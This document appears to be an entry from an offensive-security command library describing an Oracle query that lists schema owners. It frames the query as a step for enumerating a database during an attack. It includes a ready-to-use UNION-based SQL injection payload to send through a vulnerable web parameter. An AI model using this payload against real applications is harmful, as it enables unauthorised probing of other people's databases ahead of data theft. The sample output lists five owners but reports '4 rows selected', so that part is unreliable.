---
id: fe6144f3-0d31-46bd-93a4-c6076504a7db
name: oracle-select-distinct-owners-from-all-tables
type: command
executor: sql
data: SELECT DISTINCT owner FROM all_tables;
output: null
created_at: '2023-04-06T03:56:35.171388+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Oracle Database
tags:
  - database-enumeration
  - sql-injection
verified: true
validated: true
---

# oracle-select-distinct-owners-from-all-tables

## Command

```sql
SELECT DISTINCT owner FROM all_tables;
```

## Description

This SQL command queries the Oracle 'all_tables' system view to retrieve a list of unique table owners (schemas) visible to the current user. It is typically used in SQL injection payloads to enumerate database structure during discovery phases of an attack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a static query with no user-defined parameters; column selection is fixed. | N/A |

## Examples

### Basic Usage

Execute directly in an Oracle SQL client (e.g., SQL*Plus) or inject via a vulnerable web parameter:

```sql
SELECT DISTINCT owner FROM all_tables;
```

### Injected Usage (UNION Example)

For a vulnerable query expecting 3 columns:

```sql
' UNION SELECT NULL, NULL, owner FROM all_tables WHERE ROWNUM <= 10 --
```

(Added ROWNUM for limiting results in injection scenarios.)

## Expected Output

A list of distinct owner names:

```
OWNER
------------------------------
SYS
SYSTEM
HR
APP_USER
SCOTT

4 rows selected.
```

Success is indicated by unique schema names appearing in the result set, revealing database users and potential data locations.

## Related

- [[procedures/Oracle-SQL-Database-Enumeration-via-SQL-Injection]]
- [[techniques/System-Information-Discovery|T1082]]
